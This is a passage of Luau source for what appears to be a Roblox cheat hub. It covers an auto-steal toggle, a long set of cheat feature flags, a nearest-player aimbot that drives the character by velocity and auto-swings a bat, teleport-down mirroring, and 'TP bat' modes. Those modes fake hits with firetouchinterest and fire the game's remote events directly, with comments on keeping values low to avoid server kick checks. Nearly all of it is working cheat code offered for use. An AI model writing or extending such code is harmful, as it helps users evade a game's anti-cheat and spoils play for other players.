        if ok and p then pcall(sv3ExecuteSteal, p) end
    end)
end
local function stopSemiV3Mode()
    if SemiV3State.conn then pcall(function() SemiV3State.conn:Disconnect() end); SemiV3State.conn = nil end
    SemiV3State.isStealing = false
    setProgress(0)
end




local function stopAll()
    stopSemiV3Mode()
    setProgress(0)
end
local function startAll()
    if not isEnabled then return end
    startSemiV3Mode()
end

-- ============================================================
-- UI BRIDGE  (this was MISSING -> the "Instant Steal" toggle
-- button in the main GUI did nothing, and the Radius box too)
-- ============================================================
_G.PrimeInstantSteal = {
    SetEnabled = function(v)
        isEnabled = (v == true)
        if isEnabled then startAll() else stopAll() end
        saveConfig()
    end,
    GetEnabled = function() return isEnabled end,
    SetRadius = function(v)
        local n = tonumber(v) or Radii.SemiV3
        n = math.clamp(math.floor(n + 0.5), 1, 500)
        Radii.Normal = n
        Radii.Semi   = n
        Radii.SemiV2 = n
        Radii.SemiV3 = n
        saveConfig()
    end,
    GetRadius = function() return Radii.SemiV3 end,
    SetMode = function(m)
        -- Only the SemiV3 engine is implemented, so the engine always
        -- runs in SemiV3 regardless of what gets passed here.
        selectedMode = "SemiV3"
        if isEnabled then startAll() end
        saveConfig()
    end,
    GetMode = function() return "SemiV3" end,
}

startAll()
end) end)
-- end of insta steal
repeat task.wait() until game:IsLoaded()

Players, RunService, __HH.UIS, TS, Lighting, __HH.HS = game:GetService("Players"), game:GetService("RunService"), game:GetService("UserInputService"), game:GetService("TweenService"), game:GetService("Lighting"), game:GetService("HttpService")
LP = Players.LocalPlayer

__HH.antiRagdollEnabled, __HH.infJumpEnabled = false, false
__HH.medusaCounterEnabled = false
__HH.medusaResetEnabled = false
__HH.batCounterEnabled = false
__HH.unwalkEnabled = false
__HH.medusaDebounce, __HH.medusaLastUsed, __HH.dropActive = false, 0, false
Conns = {autoSteal = nil, antiRag = nil, batCounter = nil, anchor = {}}
__HH.tpLockEnabled = false
__HH.tpBatMode = "V2"
__HH.antiVoidEnabled = false
__HH.antiVoidConn = nil
__HH.antiVoidSafeCFrame = nil
__HH.tpLockSetVisual = nil
__HH.mobBtnRefs = nil
__HH.batV2Enabled = false
__HH.batV2SetVisual = nil
__HH.antiDieEnabled = false
__HH.setAntiDieVisual = nil
__HH.antiDieConns = {}
__HH.setBatCounterVisual = nil
local startBatCounter, stopBatCounter
__HH.antiLagEnabled = false
__HH.removeAccessoriesEnabled = false
__HH.antiLagDescConn = nil
__HH.stretchRezEnabled = false
__HH.stretchRezConn = nil
__HH.setStretchRezVisual = nil

-- FRHUB Auto Left / Auto Right state, UI setters and controller functions.
-- Pure is already near Luau's 200-local limit, so these cross-script bridge
-- names are initialized explicitly while the implementation itself is scoped.
autoLeftEnabled, autoRightEnabled = false, false
autoLeftSetVisual, autoRightSetVisual = nil, nil
startAutoLeft, stopAutoLeft, startAutoRight, stopAutoRight = nil, nil, nil, nil
toggleAutoLeft, toggleAutoRight = nil, nil

__HH.unwalkSavedAnimate = nil
__HH._anyKeyListening = false
end
do
__HH._lastKbSet = 0
__HH.autoTPEnabled = false
__HH.autoTPHeight = 20
__HH.autoTPConn = nil
__HH.setAutoTPVisual = nil
__HH.setInfJumpVisual = nil
__HH.mainFrame = nil
__HH.bgImage = nil
local _guiLocked = false

setCarryVisual = nil
setLaggerVisual = nil
setAutoSwingVisual = nil
__HH.setBatCounterVisual = nil
setAntiRagVisual = nil
setMedusaVisual = nil
setMedusaResetVisual = nil
setUnwalkVisual = nil
setAntiLagVisual = nil
__HH.setStretchRezVisual = nil
__HH.setAutoTPVisual = nil
setSaturationVisual = nil
setVoidModeVisual = nil
setStretchRezV2Visual = nil
setTranspVisual = nil
setLockVisual = nil
setMobVisual = nil
setCircleBtnsVisual = nil
setShapeVisual = nil
setRectVisual = nil
__HH.setInfJumpVisual = nil

__HH.espEnabled = false
__HH.headlessEnabled = false
__HH.korbloxEnabled = false
__HH.skinOutfitSetVisual = nil
__HH.setESPVisual = nil
local skinOutfitEnabled = false
local skinOutfitPreset = "V1"

uiScaleValue = 0.6
__HH.uiScaleObject = nil
__HH.guiWidth = 400
__HH.guiHeight = 600

__HH.TOGGLE_ON_COLOR = Color3.fromRGB(70, 145, 235)

-- ============================================
-- FR Hub NEW AIMBOT (replaces Pure/Cursed aimbot engine).
if type(aimbotV1Speed) ~= "number" then aimbotV1Speed = 56 end
batAimMode = "bypass" -- bypass-only aimbot mode
__HH.aimBypassMode = __HH.aimBypassMode or "V1"
autoBatEnabled = autoBatEnabled == true
do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LP = Players.LocalPlayer
    local GRAVITY = -196.2

    local _hCache = setmetatable({}, {__mode = "k"})
    local _vCache = setmetatable({}, {__mode = "k"})

    local function _destroyH(part)
        local c = _hCache[part]
        if c then
            pcall(function() if c[1] and c[1].Parent then c[1]:Destroy() end end)
            pcall(function() if c[2] and c[2].Parent then c[2]:Destroy() end end)
            _hCache[part] = nil
        end
    end
    local function _destroyV(part)
        local c = _vCache[part]
        if c then
            pcall(function() if c[1] and c[1].Parent then c[1]:Destroy() end end)
            pcall(function() if c[2] and c[2].Parent then c[2]:Destroy() end end)
            _vCache[part] = nil
        end
    end
    local function _destroyLV(part)
        _destroyH(part)
        _destroyV(part)
    end
    local function _getHLV(part)
        local c = _hCache[part]
        local lv = c and c[1]
        if lv and lv.Parent == part then return lv end
        _destroyH(part)
        local att = Instance.new("Attachment"); att.Parent = part
        lv = Instance.new("LinearVelocity")
        lv.Attachment0 = att
        lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Plane
        lv.PrimaryTangentAxis = Vector3.new(1, 0, 0)
        lv.SecondaryTangentAxis = Vector3.new(0, 0, 1)
        lv.MaxForce = math.huge
        lv.RelativeTo = Enum.ActuatorRelativeTo.World
        lv.PlaneVelocity = Vector2.zero
        lv.Parent = part
        _hCache[part] = {lv, att}
        return lv
    end
    local function _getVLV(part)
        local c = _vCache[part]
        local lv = c and c[1]
        if lv and lv.Parent == part then return lv end
        _destroyV(part)
        local att = Instance.new("Attachment"); att.Parent = part
        lv = Instance.new("LinearVelocity")
        lv.Attachment0 = att
        lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
        lv.MaxForce = math.huge
        lv.RelativeTo = Enum.ActuatorRelativeTo.World
        lv.VectorVelocity = Vector3.zero
        lv.Parent = part
        _vCache[part] = {lv, att}
        return lv
    end
    local function _setV(part, vec)
        if not part or not part.Parent then return end
        if vec.Magnitude < 0.01 then
            _destroyLV(part)
            return
        end
        if math.abs(vec.Y) < 0.01 then
            _destroyV(part)
            local lv = _getHLV(part)
            lv.PlaneVelocity = Vector2.new(vec.X, vec.Z)
        else
            _destroyH(part)
            local lv = _getVLV(part)
            lv.VectorVelocity = vec
        end
    end
    local function _getV(part)
        if not part or not part.Parent then return Vector3.zero end
        return part.AssemblyLinearVelocity
    end

    local newAimEnabled = false
    local newBatEquippedThisRun = false
    local _aimbotTarget = nil
    local _aimbotTargetPlr = nil
    local _jumpHistory = {}
    local _infiniteJumpDetected = false
    local _tpDownDetected = false
    local _peakY = 0
    local _normalModeTimer = 0
    local _lastTargetY = 0

    local function getAimSpeed()
        local n = tonumber(aimbotV1Speed) or 56
        return math.clamp(n, 1, 200)
    end

    local function findBat()
        local char = LP.Character
        if not char then return nil end
        for _, tool in ipairs(char:GetChildren()) do
            if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then
                return tool
            end
        end
        local bp = LP:FindFirstChild("Backpack")
        if bp then
            for _, tool in ipairs(bp:GetChildren()) do
                if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then
                    return tool
                end
            end
        end
        return nil
    end

    local function getClosestTarget()
        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if not root then return nil, nil, math.huge end
        local closest, closestPlr, minDist = nil, nil, math.huge
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then
                local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if tRoot and hum and hum.Health > 0 then
                    local dist = (tRoot.Position - root.Position).Magnitude
                    if dist < minDist then minDist = dist; closest = tRoot; closestPlr = plr end
                end
            end
        end
        return closest, closestPlr, minDist
    end

    local function getStickyTarget(currentRoot)
        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if not root then return nil, nil end
        local newClosest, newPlr, newDist = getClosestTarget()
        if not newClosest then return nil, nil end
        if currentRoot and currentRoot.Parent then
            local currentPlr = Players:GetPlayerFromCharacter(currentRoot.Parent)
            local hum = currentRoot.Parent:FindFirstChildOfClass("Humanoid")
            if currentPlr and hum and hum.Health > 0 then
                local currentDist = (currentRoot.Position - root.Position).Magnitude
                if currentPlr == newPlr or newDist > currentDist * 0.7 then
                    return currentRoot, currentPlr
                end
            end
        end
        return newClosest, newPlr
    end

    local function swingCurrentBat(char)
        local bat = findBat()
        if bat and bat.Parent == char and bat:IsA("Tool") then
            pcall(function() bat:Activate() end)
        end
    end

    local function detectInfiniteJumpGeneric(targetHRP, hist, infDetected, tpDetected, peakY, normalTimer, lastY)
        if not targetHRP then
            return "normal", {}, false, false, 0, 0, 0
        end
        local velY = targetHRP.Velocity.Y
        local posY = targetHRP.Position.Y
        if posY > peakY then peakY = posY end
        table.insert(hist, velY)
        if #hist > 12 then table.remove(hist, 1) end
        local upwardSpikes = 0
        for i = 2, #hist do
            if hist[i] > 0 and hist[i-1] < 0 then
                upwardSpikes = upwardSpikes + 1
            end
        end
        if upwardSpikes >= 0 and not infDetected then
            infDetected = true; peakY = posY; tpDetected = false
        end
        if infDetected and velY < -80 then
            tpDetected = true
            return "tp_down", hist, infDetected, tpDetected, peakY, normalTimer, posY
        end
        if infDetected and velY < -20 and (posY < peakY - 5) then
            return "falling", hist, infDetected, tpDetected, peakY, normalTimer, posY
        end
        if infDetected and math.abs(velY) < 5 and posY < lastY + 2 then
            normalTimer = normalTimer + 1
            if normalTimer > 8 then
                return "normal", {}, false, false, 0, 0, posY
            end
        else
            normalTimer = 0
        end
        lastY = posY
        if infDetected then
            return tpDetected and "tp_down" or "infinite_jump", hist, infDetected, tpDetected, peakY, normalTimer, lastY
        end
        return "normal", hist, infDetected, tpDetected, peakY, normalTimer, lastY
    end

    local function computePredictedPos(myHRP, targetHRP, mode)
        local curPos = targetHRP.Position
        local curVel = _getV(targetHRP)
        if mode == "tp_down" then
            local landX = curPos.X + curVel.X * 0.5
            local landZ = curPos.Z + curVel.Z * 0.5
            local rp = RaycastParams.new()
            rp.FilterDescendantsInstances = {LP.Character}
            rp.FilterType = Enum.RaycastFilterType.Exclude
            local rr = workspace:Raycast(Vector3.new(landX, curPos.Y, landZ), Vector3.new(0, -200, 0), rp)
            local groundY = rr and rr.Position.Y or curPos.Y
            return Vector3.new(landX, groundY + 0.5, landZ)
        elseif mode == "infinite_jump" then
            return curPos + Vector3.new(curVel.X * 0.175, -2, curVel.Z * 0.175)
        elseif mode == "falling" then
            local deltaY = curVel.Y * 0.22
            local disc = curVel.Y * curVel.Y - 2 * GRAVITY * math.abs(deltaY)
            local ballT = disc > 0 and ((-curVel.Y - math.sqrt(disc)) / (-GRAVITY)) or 0.18
            ballT = math.clamp(ballT, 0.04, 0.55)
            return Vector3.new(
                curPos.X + curVel.X * ballT,
                curPos.Y + curVel.Y * ballT + 0.5 * GRAVITY * ballT * ballT + 2.8,
                curPos.Z + curVel.Z * ballT
            )
        else
            local myPos = myHRP.Position
            local targetPos = targetHRP.Position
            local distance = (targetPos - myPos).Magnitude
            local speedFactor = math.clamp(curVel.Magnitude / 40, 0, 1.2)
            local distFactor = math.clamp(distance / 80, 0, 1)
            local leadTime = 0.14 + speedFactor * 0.12 + distFactor * 0.08
            local predictPos = targetPos + curVel * leadTime
            predictPos = predictPos + targetHRP.CFrame.LookVector * 0.3
            return predictPos
        end
    end

    local function enableNewAim()
        newAimEnabled = true
        newBatEquippedThisRun = false
        _jumpHistory = {}; _infiniteJumpDetected = false; _tpDownDetected = false
        _peakY = 0; _normalModeTimer = 0; _lastTargetY = 0
        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then hum.AutoRotate = false end
    end

    local function disableNewAim()
        newAimEnabled = false
        newBatEquippedThisRun = false
        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hrp then _destroyLV(hrp); hrp.AssemblyAngularVelocity = Vector3.zero end
        if hum then hum.AutoRotate = true end
    end

    -- Standalone AIMBOT + VELOCITY backend.
    -- Uses nearest-player selection, ping prediction, direct assembly velocity,
    -- smooth angular steering, automatic bat equip, and a short swing cooldown.
    local aimEnabled = false
    local aimConnection = nil
    local aimLastSwing = 0
    local aimLastTarget = nil
    local AimStats = game:GetService("Stats")

    local function aimGetNearestTarget(root)
        local nearest, nearestDistance = nil, math.huge
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LP and player.Character then
                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
                    local distance = (root.Position - targetRoot.Position).Magnitude
                    if distance < nearestDistance then
                        nearest, nearestDistance = targetRoot, distance
                    end
                end
            end
        end
        return nearest, nearestDistance
    end

    local function aimGetPingSeconds()
        local pingSeconds = 0.1
        pcall(function()
            local item = AimStats.Network.ServerStatsItem["Data Ping"]
            local ping = item and item:GetValue() or 100
            pingSeconds = math.clamp((tonumber(ping) or 100) / 1000, 0.03, 0.25)
        end)
        return pingSeconds
    end

    local function aimGetTool(character)
        local tool = character and character:FindFirstChildOfClass("Tool")
        if tool then return tool end
        local backpack = LP:FindFirstChildOfClass("Backpack")
        if backpack then
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA("Tool") then
                    local name = item.Name:lower()
                    if name:find("bat", 1, true) or name:find("slap", 1, true) then
                        return item
                    end
                end
            end
        end
        return nil
    end

    local function aimGetParts()
        local character = LP.Character
        if not character then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local root = character:FindFirstChild("HumanoidRootPart")
        if not humanoid or not root or humanoid.Health <= 0 then return end
        return character, humanoid, root
    end

    local function aimStop()
        if aimConnection then
            pcall(function() aimConnection:Disconnect() end)
            aimConnection = nil
        end
        aimLastTarget = nil
        local _, humanoid, root = aimGetParts()
        if humanoid then humanoid.AutoRotate = true end
        if root then
            root.AssemblyAngularVelocity = Vector3.zero
            root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y, 0)
        end
    end

    local function aimStart()
        aimStop()
        aimEnabled = true
        aimConnection = RunService.RenderStepped:Connect(function()
            if not aimEnabled then return end
            local character, humanoid, root = aimGetParts()
            if not character then return end

            local targetRoot, distance = aimGetNearestTarget(root)
            if not targetRoot then
                aimLastTarget = nil
                humanoid.AutoRotate = true
                return
            end
            aimLastTarget = targetRoot

            local targetVelocity = targetRoot.AssemblyLinearVelocity or targetRoot.Velocity or Vector3.zero
            local predictionTime = math.clamp(aimGetPingSeconds() + 0.12, 0.12, 0.35)
            local predictedPosition = targetRoot.Position + targetVelocity * predictionTime
            local targetHumanoid = targetRoot.Parent and targetRoot.Parent:FindFirstChildOfClass("Humanoid")
            if targetHumanoid and targetHumanoid.FloorMaterial == Enum.Material.Air then
                predictedPosition += Vector3.new(0, math.clamp(targetVelocity.Y * 0.08, -4, 4), 0)
            end

            local delta = predictedPosition - root.Position
            local horizontal = Vector3.new(delta.X, 0, delta.Z)
            humanoid.AutoRotate = false
            if horizontal.Magnitude > 0.05 then
                local facing = horizontal.Unit
                local yaw = math.atan2(-facing.X, -facing.Z)
                local angle = math.clamp(
                    (yaw - math.rad(root.Orientation.Y) + math.pi) % (2 * math.pi) - math.pi,
                    -0.5,
                    0.5
                )
                root.AssemblyAngularVelocity = Vector3.new(0, angle * 18, 0)
                local speed = math.clamp(59 + horizontal.Magnitude * 0.15, 1, 120)
                root.AssemblyLinearVelocity = Vector3.new(
                    facing.X * speed,
                    math.clamp(delta.Y * 2.5, -52, 52),
                    facing.Z * speed
                )
                pcall(function() humanoid:Move(facing, false) end)
            end

            local tool = aimGetTool(character)
            if tool and tool.Parent ~= character then
                pcall(function() humanoid:EquipTool(tool) end)
            end
            tool = character:FindFirstChildOfClass("Tool") or tool
            if tool and distance <= 13 and os.clock() - aimLastSwing >= 0.08 then
                aimLastSwing = os.clock()
                pcall(function() tool:Activate() end)
            end
        end)
    end

    local function aimSetEnabled(enabled)
        enabled = enabled == true
        if enabled then
            aimStart()
        else
            aimEnabled = false
            aimStop()
        end
    end

    local function setAutoBatState(enabled)
        if enabled then
            if _G.HorizonStealModes then _G.HorizonStealModes.Suspend() end
            if __HH.stopBodyLock then __HH.stopBodyLock() end
            if _G.HHGoodAimSet then pcall(_G.HHGoodAimSet, false) end
            if _G.PrimeBypassV2Stop then pcall(_G.PrimeBypassV2Stop) end
            disableNewAim()
            aimSetEnabled(true)
        else
            if _G.HorizonStealModes then _G.HorizonStealModes.Resume() end
            if __HH.bodyLockEnabled and __HH.startBodyLock then task.delay(0.2, __HH.startBodyLock) end
            aimSetEnabled(false)
            disableNewAim()
        end
    end

    -- MIRROR TP DOWN (ported from FR HUB and adapted to Pure's AIM BOT).
    -- It watches Pure's current sticky target and mirrors any sudden 3-stud
    -- downward move by placing the local root at Pure's TP DOWN level.
    do
        local MIRROR_TP_DROP_THRESHOLD = 3
        local MIRROR_TP_DOWN_Y = -7.00
        local mirrorEnabled = false
        local mirrorTrackedRoot = nil
        local mirrorPreviousY = nil
        local mirrorLastTeleport = 0
        local mirrorHeartbeat = nil
        local mirrorCharacterConn = nil

        local function clearMirrorTracking()
            mirrorTrackedRoot = nil
            mirrorPreviousY = nil
        end

        local function getPureAimTarget()
            if not newAimEnabled then return nil end
            local target = _aimbotTarget
            if not target or not target.Parent then return nil end
            local targetHumanoid = target.Parent:FindFirstChildOfClass("Humanoid")
            if not targetHumanoid or targetHumanoid.Health <= 0 then return nil end
            return target
        end

        local function mirrorTeleportDown()
            local character = LP.Character
            local root = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            if not root or not humanoid or humanoid.Health <= 0 then return end

            local now = tick()
            if now - mirrorLastTeleport < 0.08 then return end
            mirrorLastTeleport = now

            local _, yaw = root.CFrame:ToEulerAnglesYXZ()
            root.CFrame = CFrame.new(root.Position.X, MIRROR_TP_DOWN_Y, root.Position.Z)
                * CFrame.Angles(0, yaw, 0)

            -- Use Pure's own AIM BOT LinearVelocity cleanup, matching FR's
            -- shared-velocity behavior without writing HRP.Velocity directly.
            _setV(root, Vector3.zero)
            root.AssemblyAngularVelocity = Vector3.zero
        end

        local function setMirrorEnabled(on)
            mirrorEnabled = on == true
            if not mirrorEnabled then clearMirrorTracking() end
            if _G.PureMirrorTPDownSetVisual then
                pcall(_G.PureMirrorTPDownSetVisual, mirrorEnabled)
            end
            return mirrorEnabled
        end

        pcall(function()
            if _G.PureMirrorTPDown and _G.PureMirrorTPDown.Destroy then
                _G.PureMirrorTPDown.Destroy()
            end
        end)

        mirrorHeartbeat = RunService.Heartbeat:Connect(function()
            if not mirrorEnabled then
                clearMirrorTracking()
                return
            end

            local target = getPureAimTarget()
            if not target then
                clearMirrorTracking()
                return
            end

            local currentY = target.Position.Y
            if target ~= mirrorTrackedRoot then
                mirrorTrackedRoot = target
                mirrorPreviousY = currentY
                return
            end

            local previousY = mirrorPreviousY
            mirrorPreviousY = currentY
            if previousY and previousY - currentY >= MIRROR_TP_DROP_THRESHOLD then
                mirrorTeleportDown()
                mirrorPreviousY = target.Parent and target.Position.Y or nil
            end
        end)

        mirrorCharacterConn = LP.CharacterAdded:Connect(clearMirrorTracking)

        _G.PureMirrorTPDown = {
            enabled = function() return mirrorEnabled end,
            setEnabled = setMirrorEnabled,
            getTarget = getPureAimTarget,
            Destroy = function()
                mirrorEnabled = false
                clearMirrorTracking()
                if mirrorHeartbeat then mirrorHeartbeat:Disconnect(); mirrorHeartbeat = nil end
                if mirrorCharacterConn then mirrorCharacterConn:Disconnect(); mirrorCharacterConn = nil end
            end,
        }
    end

    RunService.RenderStepped:Connect(function()
        if not newAimEnabled then return end
        local char = LP.Character; if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
        local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end

        if not newBatEquippedThisRun then
            newBatEquippedThisRun = true
            if not char:FindFirstChildOfClass("Tool") then
                local bat = findBat()
                if bat then pcall(function() hum:EquipTool(bat) end) end
            end
        end

        local target, targetPlr = getStickyTarget(_aimbotTarget)
        if not target then
            _aimbotTarget = nil
            _lastTargetY = 0
            swingCurrentBat(char)
            return
        end
        _aimbotTarget = target
        _aimbotTargetPlr = targetPlr

        local mode
        mode, _jumpHistory, _infiniteJumpDetected, _tpDownDetected, _peakY, _normalModeTimer, _lastTargetY =
            detectInfiniteJumpGeneric(target, _jumpHistory, _infiniteJumpDetected, _tpDownDetected, _peakY, _normalModeTimer, _lastTargetY)

        local predictPos = computePredictedPos(root, target, mode)

        local direction = predictPos - root.Position
        local flatDir = Vector3.new(direction.X, 0, direction.Z)
        if flatDir.Magnitude > 0.01 then flatDir = flatDir.Unit else flatDir = Vector3.new(0, 0, 0) end

        local desiredHeight = predictPos.Y
        if mode == "normal" then
            local jumpOffset = math.max(0, _getV(target).Y * 0.18)
            desiredHeight = predictPos.Y + 3.7 + jumpOffset
        end

        local yVel = (desiredHeight - root.Position.Y) * 22 + _getV(target).Y * 1.1
        if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
        yVel = math.clamp(yVel, -70, 135)

        local spd = getAimSpeed()
        local desiredVel = Vector3.new(flatDir.X * spd, yVel, flatDir.Z * spd)
        _setV(root, _getV(root):Lerp(desiredVel, 0.85))

        local rotPredictTime = math.clamp(_getV(target).Magnitude / 120, 0.05, 0.25)
        local rotPredictedPos = target.Position + _getV(target) * rotPredictTime
        local toPredict = rotPredictedPos - root.Position
        if toPredict.Magnitude > 0.1 then
            local goalCF = CFrame.lookAt(root.Position, rotPredictedPos)
            local diffCF = root.CFrame:Inverse() * goalCF
            local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
            rx = math.clamp(rx, -2.5, 2.5); ry = math.clamp(ry, -2.5, 2.5); rz = math.clamp(rz, -2.5, 2.5)
            root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 50, ry * 50, rz * 50))
        end

        swingCurrentBat(char)
    end)

    RunService.RenderStepped:Connect(function()
        if not newAimEnabled then return end
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local v = _getV(root)
        if math.abs(v.X) > 350 or math.abs(v.Z) > 350 then
            _setV(root, Vector3.new(0, v.Y, 0))
        end
    end)

    LP.CharacterAdded:Connect(function(char)
        task.wait(0.5)
        newBatEquippedThisRun = false
        _jumpHistory = {}; _infiniteJumpDetected = false; _tpDownDetected = false
        _peakY = 0; _normalModeTimer = 0; _lastTargetY = 0
        _aimbotTarget = nil
        if newAimEnabled then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum.AutoRotate = false end
        end
        if aimEnabled then
            task.defer(function() if aimEnabled then aimStart() end end)
        end
    end)

    -- Raw AIM BOT backend. Anti Kick only performs temporary Timer suppression.
    _G.PureCursedSetAimbot = setAutoBatState
    _G.PureCursedGetAimbot = function()
        return aimEnabled == true
    end
    _G.PureCursedClearAimVelocity = function()
        local character = LP.Character
        local root = character and character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        root.AssemblyAngularVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y, 0)
    end
    function toggleBatV2()
        local turningOn = not __HH.batV2Enabled
        _G.PureDropThenAimSafeModeAuthorized = false
        __HH.batV2Enabled = turningOn
        setAutoBatState(__HH.batV2Enabled)
        if __HH.batV2SetVisual then __HH.batV2SetVisual(__HH.batV2Enabled) end
        if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(__HH.batV2Enabled) end
        return __HH.batV2Enabled
    end
    function stopAimbotFull()
        __HH.batV2Enabled = false
        setAutoBatState(false)
        if __HH.batV2SetVisual then __HH.batV2SetVisual(false) end
        if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(false) end
    end
    function queueAutoBatStart()
        if not __HH.batV2Enabled then __HH.batV2Enabled = true end
        setAutoBatState(true)
    end
    function stopBatAimbot()
        setAutoBatState(false)
    end
    -- TP BAT V1/V2/V3: Prime target/marker engines plus message direct teleport mode.
    -- V1 uses the safe-position marker when the target leaves the map bounds.
    -- V2 uses UpperTorso tracking, gradual pull, touch hit and swing cooldown.
    local tpBatActive = false
    local tpBatHeartbeat = nil
    local tpBatPreviousAutoRotate = nil
    local tpBatV1 = {
        target = nil,
        lastSafeCFrame = nil,
        marker = nil,
        lastSwing = 0,
        minX = -536.2, maxX = -422,
        minY = -75, maxY = 75,
        minZ = -71.8, maxZ = 192.9,
        groundY = -7,
        markerDistance = 3,
    }
    local tpBatV2 = {
        target = nil,
        cooling = false,
        lastSwing = 0,
        height = 0.35,
        -- Conservative values prevent network spikes and server kick checks.
        pull = 80,
        maxVelocity = 220,
        snapDistance = 7.5,
        stickRange = 55,
    }
    -- Adaptsrc's nominal 0.02s cadence; 0.007 caused extreme remote spam.
    local tpBatSwingDelay = 0.02
    local tpBatV3LastSwing = 0

    -- Adaptsrc-compatible state names. The engine below keeps these aliases
    -- synchronized so its V1/V2 lifecycle matches the original integration.
    _G._AdaptYznHighPingV1 = _G._AdaptYznHighPingV1 or { lastSwing = 0, SwingDelay = 0.02 }
    _G._AdaptGalTpBatV1 = tpBatV1
    _G._AdaptYznTpBatV2 = tpBatV2
    _G._AdaptYoutTpBatV2 = _G._AdaptYoutTpBatV2 or { hitCooling = false }
    _G._AdaptTpBatLogic = _G._AdaptTpBatLogic or {}
    _G._AdaptTpBatActive = false
    _G._AdaptTpBatSwingCooldown = false

    local function clearTPBatV1Marker()
        if tpBatV1.marker then pcall(function() tpBatV1.marker:Destroy() end) end
        tpBatV1.marker = nil
    end

    local function isTPBatV1InBounds(pos)
        return pos and pos.X >= tpBatV1.minX and pos.X <= tpBatV1.maxX
            and pos.Y >= tpBatV1.minY and pos.Y <= tpBatV1.maxY
            and pos.Z >= tpBatV1.minZ and pos.Z <= tpBatV1.maxZ
    end

    local function trackTPBatV1Target(targetRoot)
        if tpBatV1.target ~= targetRoot then
            tpBatV1.lastSafeCFrame = nil
            clearTPBatV1Marker()
        end
        tpBatV1.target = targetRoot
        if not targetRoot then return end
        if isTPBatV1InBounds(targetRoot.Position) then
            tpBatV1.lastSafeCFrame = targetRoot.CFrame
            clearTPBatV1Marker()
            return
        end
        if not tpBatV1.lastSafeCFrame or tpBatV1.marker then return end
        local cf = tpBatV1.lastSafeCFrame
        local marker = Instance.new("Part")
        marker.Name = "PrimeArabTpBatLastPosition"
        marker.Shape = Enum.PartType.Ball
        marker.Size = Vector3.new(3, 3, 3)
        marker.Color = Color3.fromRGB(70, 110, 255)
        marker.Material = Enum.Material.Neon
        marker.Anchored = true
        marker.CanCollide = false
        marker.CanTouch = false
        marker.CanQuery = false
        marker.CastShadow = false
        marker.CFrame = CFrame.new(cf.Position.X, tpBatV1.groundY, cf.Position.Z) * cf.Rotation
        marker.Parent = workspace
        local highlight = Instance.new("Highlight")
        highlight.Adornee = marker
        highlight.FillColor = Color3.fromRGB(0, 110, 255)
        highlight.FillTransparency = 0.15
        highlight.OutlineColor = Color3.fromRGB(110, 200, 255)
        highlight.OutlineTransparency = 0
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Parent = marker
        tpBatV1.marker = marker
    end

    local function getTPBatV1MarkerCFrame(currentRoot)
        local marker = tpBatV1.marker
        if not marker or not marker.Parent then return nil end
        local v = Vector3.new(currentRoot.Position.X - marker.Position.X, 0, currentRoot.Position.Z - marker.Position.Z)
        if v.Magnitude <= 0.05 then v = -marker.CFrame.LookVector end
        if v.Magnitude <= 0.05 then v = Vector3.new(0, 0, 1) end
        local pos = marker.Position + v.Unit * tpBatV1.markerDistance
        local look = Vector3.new(marker.Position.X - pos.X, 0, marker.Position.Z - pos.Z)
        return look.Magnitude > 0.05 and CFrame.lookAt(pos, pos + look.Unit) or CFrame.new(pos)
    end

    local function getBatTP(char, humanoid)
        local bat = char and char:FindFirstChild("Bat")
        if bat and bat:IsA("Tool") then return bat end
        local backpack = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
        if backpack then
            for _, child in ipairs(backpack:GetChildren()) do
                local n = child.Name:lower()
                if child:IsA("Tool") and (n:find("bat", 1, true) or n:find("slap", 1, true)) then
                    pcall(function() humanoid:EquipTool(child) end)
                    return child
                end
            end
        end
        return nil
    end

    local function swingTPBat(char, humanoid, targetPart, useTouch)
        local bat = getBatTP(char, humanoid)
        if not bat or bat.Parent ~= char then return end
        pcall(function() bat:Activate() end)
        if useTouch and firetouchinterest then
            local handle = bat:FindFirstChild("Handle")
            if handle and targetPart then
                pcall(function()
                    firetouchinterest(handle, targetPart, 0)
                    firetouchinterest(handle, targetPart, 1)
                end)
            end
        end
        local remote = bat:FindFirstChildWhichIsA("RemoteEvent", true)
        if remote then pcall(function() remote:FireServer() end) end
        if useTouch then
            local fn = bat:FindFirstChildWhichIsA("RemoteFunction", true)
            if fn then pcall(function() fn:InvokeServer() end) end
        end
    end

